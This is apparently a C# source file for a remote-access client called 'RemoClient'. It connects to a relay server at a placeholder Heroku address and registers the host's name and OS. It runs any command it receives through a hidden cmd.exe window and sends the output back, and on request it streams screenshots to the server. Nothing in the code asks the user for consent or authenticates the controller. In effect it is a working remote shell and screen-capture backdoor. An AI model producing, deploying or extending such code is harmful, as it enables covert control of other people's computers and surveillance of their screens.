using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using SocketIOClient;

namespace RemoClient
{
    class Program
    {
        private static SocketIOClient.SocketIO client;
        private static string computerName = Environment.MachineName;
        // CHANGE THIS TO YOUR PUBLIC SERVER URL
        // private const string ServerUrl = "http://localhost:3000"; 
        private const string ServerUrl = "https://remo-server-placeholder.herokuapp.com"; 

        private static bool isRdpActive = false;
        private static CancellationTokenSource rdpCts;

        static async Task Main(string[] args)
        {
            Console.WriteLine("Remo Client Starting...");
            
            // Connect to Relay Server
            client = new SocketIOClient.SocketIO(ServerUrl);

            client.OnConnected += async (sender, e) =>
            {
                Console.WriteLine("Connected to Relay Server.");
                await client.EmitAsync("register", new
                {
                    type = "client",
                    name = computerName,
                    os = RuntimeInformation.OSDescription,
                    country = "Germany", // Logic for GeoIP could be added here
                    countryCode = "de"
                });
            };

            client.On("terminal_command", async response =>
            {
                var data = response.GetValue<dynamic>();
                string command = data.GetProperty("command").GetString();
                Console.WriteLine($"Executing: {command}");
                ExecuteCommand(command);
            });

            client.On("rdp_start", async response =>
            {
                var data = response.GetValue<dynamic>();
                bool active = data.GetProperty("active").GetBoolean();
                
                if (active && !isRdpActive)
                {
                    Console.WriteLine("Starting RDP Stream...");
                    isRdpActive = true;
                    rdpCts = new CancellationTokenSource();
                    _ = Task.Run(() => ScreenCaptureLoop(rdpCts.Token));
                }
                else if (!active)
                {
                    Console.WriteLine("Stopping RDP Stream.");
                    isRdpActive = false;
                    rdpCts?.Cancel();
                }
            });

            await client.ConnectAsync();
            
            while (true)
            {
                await Task.Delay(1000);
            }
        }

        private static void ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    string error = p.StandardError.ReadToEnd();
                    p.WaitForExit();

                    string fullOutput = string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";

                    client.EmitAsync("terminal_output", new
                    {
                        output = fullOutput
                    });
                }
            }
            catch (Exception ex)
            {
                client.EmitAsync("terminal_output", new
                {
                    output = "System Error: " + ex.Message
                });
            }
        }

        private static async Task ScreenCaptureLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    string base64Image = CaptureScreen();
                    if (!string.IsNullOrEmpty(base64Image))
                    {
                        await client.EmitAsync("rdp_frame", new { image = base64Image });
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Capture Error: {ex.Message}");
                }
                await Task.Delay(200, token); // ~5 FPS for basic RDP
            }
        }

        private static string CaptureScreen()
        {
            try
            {
                Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        // Save as low quality JPEG for performance
                        var encoder = GetEncoder(ImageFormat.Jpeg);
                        var parameters = new EncoderParameters(1);
                        parameters.Param[0] = new EncoderParameter(Encoder.Quality, 40L);
                        
                        bitmap.Save(ms, encoder, parameters);
                        byte[] byteImage = ms.ToArray();
                        return Convert.ToBase64String(byteImage);
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid) return codec;
            }
            return null;
        }
    }
}
